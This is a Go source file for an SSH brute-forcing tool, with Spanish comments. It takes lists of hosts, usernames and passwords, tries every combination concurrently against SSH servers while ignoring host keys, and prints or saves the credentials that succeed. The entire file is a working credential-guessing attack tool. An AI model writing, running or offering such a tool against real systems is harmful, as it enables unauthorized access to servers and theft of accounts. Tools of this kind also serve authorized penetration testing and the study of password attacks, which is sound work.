/* Simple SSH Bruteforcing Tool*/

/*
TO-DO
- Para el listado de user y pass, si no encuentra nada que no pinte todos los intentos"
- cada goroutine puede construir un elemento de tipo host con la respuesta y lo almacenamos en un nuevo arrayde resultados-
- el status debe ser boolean? quizas con un string indicamos mejor el estado si el puerto está cerrado o las credenciales no son validas
*/

package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

/* Flags Globales*/
var (
	//	host      = flag.String("l", "", "Single host in format IP:Port")
	host      = flag.String("l", "", "Host in format IP:Port")
	list_host = flag.String("L", "", "List of host in format IP:Port")
	user      = flag.String("u", "", "Username")
	list_user = flag.String("U", "", "List of users, one per line")
	pass      = flag.String("p", "", "Password")
	list_pwd  = flag.String("P", "", "List of passwords, one per line")
	tmout     = flag.Duration("t", 300*time.Millisecond, "SSH Dial Timeout")
	out       = flag.String("o", "", "Output file")
)

type host_data struct {
	ip     string
	port   string
	user   string
	pwd    string
	status string
}

var ssh_i []host_data
var ch = make(chan host_data)

func main() {
	fmt.Printf("##########################################\n")
	fmt.Printf("######### GO SSH BRUTE -- v0.0.2 #########\n")
	fmt.Printf("##########################################\n")

	flag.Parse()
	if *list_user == "" && *list_pwd == "" && *list_host == "" && *user == "" && *pass == "" && *host == "" {
		fmt.Printf("\nERROR - Must complete all input params\n")
		flag.PrintDefaults()
		fmt.Printf("Examples\n")
		fmt.Printf("%s -L host-list.txt -U user-list.txt -P pass-list.txt -t 500ms -o output.txt\n", os.Args[0])
		fmt.Printf("%s -l <host> -u <user> -p <pass>\n\n", os.Args[0])
		os.Exit(1)
	}

	/* Timestamp */
	fmt.Printf("Date: %s", time.Now().Format("02.01.2006 15:04:05\n"))

	if *list_host != "" && *list_user != "" && *list_pwd != "" {
		multiCall(*list_host, *list_user, *list_pwd)
	} else if *host != "" && *user != "" && *pass != "" {
		singleCall(*host, *user, *pass)
	} else {
		fmt.Printf("\nERROR - You can not mix list and singles inputs\n")
		os.Exit(1)
	}
}

func singleCall(host, user, pass string) {
	var elem host_data
	/* Direccion IP y puerto del host */
	ip, port, _ := net.SplitHostPort(host)
	/* Llamamos a la gorutina */
	wg := &sync.WaitGroup{}
	wg.Add(1)
	ip_chk := net.ParseIP(ip)
	port_chk, _ := strconv.Atoi(port)
	if ip_chk == nil || (port_chk <= 0 || port_chk >= 65535) {
		fmt.Printf("\nBad IP:Port Format -- %s:%s\n", ip, port)
	} else {
		wg.Add(1)
		go sshConn(wg, ip, port, user, pass)
	}
	/* Recogemos el retorno de la subrutina */
	elem = <-ch
	//	fmt.Printf("%+v\n", elem)
	/* Cerramos el canal la gorutina */
	close(ch)
	wg.Done()
	/* Si se ha indicado un fichero de salida */
	if *out != "" {
		f, erro := os.Create(*out)
		if erro != nil {
			fmt.Println(erro)
			os.Exit(0)
		}
		_, errw := f.WriteString("Host: " + elem.ip + "\tPort: " + elem.port + "\tUser: " + elem.user + "\tPassword: " + elem.pwd + "\tStatus: " + elem.status + "\n")
		if errw != nil {
			fmt.Println(errw)
			f.Close()
			os.Exit(0)
		}
	} else {
		fmt.Printf("%+v\n", elem)
	}
}

func multiCall(list_host, list_user, list_pwd string) {
	/* Leemos la lista de hosts */
	hosts, err := readList(list_host)
	if err != nil {
		log.Fatal("Can't read hosts file")
	}

	/* Leemos la lista de usuarios */
	users, err := readList(list_user)
	if err != nil {
		log.Fatal("Can't read users file")
	}

	/* Leemos la lista de contraseñas */
	pwds, err := readList(list_pwd)
	if err != nil {
		log.Fatal("Can't read passwords file")
	}

	/* Creamos una lista con las posibles combinaciones */
	var elem host_data
	for h := 0; h < len(hosts); h++ {
		for u := 0; u < len(users); u++ {
			for p := 0; p < len(pwds); p++ {
				//var elem host_data
				/* Direccion IP y puerto del host */
				ip, port, _ := net.SplitHostPort(hosts[h])
				/* Construimos el elemento */
				elem.ip = ip
				elem.port = port
				elem.user = users[u]
				elem.pwd = pwds[p]
				elem.status = "Initialized"
				//fmt.Printf("%+v\n", elem)
				ssh_i = append(ssh_i, elem)
			}
		}
	}

	/* Creamos la espera para cada gorutina */
	wg := &sync.WaitGroup{}
	/* Recorremos la lista de elementos*/
	for i := range ssh_i {
		/* Leemos cada elemento */
		user := ssh_i[i].user
		pwd := ssh_i[i].pwd
		ip := ssh_i[i].ip
		port := ssh_i[i].port
		//status := ssh_i[i].status
		/* Incrementamos el tiempo de espera por cada hilo */
		//	timeS += *tmout
		/* Comprobamos los parametros */
		ip_chk := net.ParseIP(ssh_i[i].ip)
		port_chk, _ := strconv.Atoi(ssh_i[i].port)
		if ip_chk == nil || (port_chk <= 0 || port_chk >= 65535) {
			fmt.Printf("\nBad IP:Port Format -- %s:%s\n", ssh_i[i].ip, ssh_i[i].port)
		} else {
			wg.Add(1)
			go sshConn(wg, ip, port, user, pwd)
		}
	}
	/* Esperamos la respuesta de las conexiones */
	ssh_o := make([]host_data, len(ssh_i))
	for i := range ssh_o {
		elem := <-ch
		ssh_o[i] = elem
	}

	/* Dormimos el programa principal hasta que
	   acabe el proceso */
	close(ch)
	wg.Wait()
	if *out != "" {
		writeOutFile(ssh_o)
	} else {
		for i := range ssh_i {
			if ssh_o[i].status == "Valid credentials" {
				fmt.Printf("%+v\n", ssh_o[i])
			}
		}
	}
}

func writeOutFile(ssh_o []host_data) {
	f, err := os.Create(*out)

	if err != nil {
		fmt.Println(err)
		return
	}

	for i := range ssh_o {
		_, err := f.WriteString("Host: " + ssh_o[i].ip + "\tPort: " + ssh_o[i].port + "\tUser: " + ssh_o[i].user + "\tPassword: " + ssh_o[i].pwd + "\tStatus: \n" + ssh_o[i].status)
		if err != nil {
			fmt.Println(err)
			f.Close()
			return
		}
	}
}

func readList(list string) (lst []string, err error) {
	/* Abrimos la lista indicada */
	file, err := os.Open(list)
	if err != nil {
		return
	}
	defer file.Close()
	/* Leemos cada entrada de la lista */
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lst = append(lst, scanner.Text())
	}
	return
}

func sshIsUp(ip, port string) (isUp bool, addr string) {
	isUp = false
	/* Comprobamos si el servicio esta escuchando */
	addr = net.JoinHostPort(ip, port)
	_, err := net.DialTimeout("tcp", addr, *tmout)
	var elem_o host_data
	elem_o.ip = ip
	elem_o.port = port
	/* Si el puerto está cerrado */
	if err != nil {
		fmt.Printf("\n\033[1;91mFAILED --> Port %s/tcp is closed on %s\033[0m\n", port, ip)
		elem_o.status = "Port closed"
		ch <- elem_o
	} else {
		/* Si el servicio en el puerto indicado esta a la escucha */
		isUp = true
	}
	return
}

func sshConn(wg *sync.WaitGroup, ip, port, user, pwd string) {
	defer wg.Done()
	/* Comprobamos que el puerto esta a la escucha */
	isUp, addr := sshIsUp(ip, port)
	if isUp == true {
		/* SSH Client Config */
		config := &ssh.ClientConfig{
			User:            user,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Auth:            []ssh.AuthMethod{ssh.Password(pwd)},
			Timeout:         *tmout,
		}
		/* Configuramos los valores que no se hayan cumplimentado */
		config.SetDefaults()
		/* SSH Connection */
		_, err := ssh.Dial("tcp", addr, config)
		var elem_o host_data
		elem_o.ip = ip
		elem_o.port = port
		elem_o.user = user
		elem_o.pwd = pwd
		if err != nil {
			fmt.Printf("\n\033[1;91mFAILED --> host: %s   login: %s   password: %s\033[0m\n", addr, user, pwd)
			elem_o.status = "Invalid credentials"
			ch <- elem_o
		} else {
			fmt.Printf("\n\033[1;92mSUCCESS --> host: %s   login: %s   password: %s\033[0m\n", addr, user, pwd)
			elem_o.status = "Valid credentials"
			ch <- elem_o
		}
	}
}
